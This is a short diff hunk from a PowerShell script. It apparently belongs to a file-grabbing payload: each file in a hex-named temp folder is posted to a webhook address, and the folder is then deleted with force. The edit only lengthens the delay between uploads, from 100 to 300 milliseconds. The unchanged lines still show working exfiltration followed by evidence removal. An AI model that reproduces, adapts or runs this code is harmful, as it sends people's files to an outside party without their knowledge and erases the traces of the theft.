@@ -15,7 +15,7 @@ Get-ChildItem "$env:tmp/476F6F6420426F7921" -File | ForEach-Object {
 	};
 
 	Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body;
-	Start-Sleep -Milliseconds 100
+	Start-Sleep -Milliseconds 300
 };
 
 Remove-Item -Path "$env:tmp/476F6F6420426F7921" -Force -Recurse;
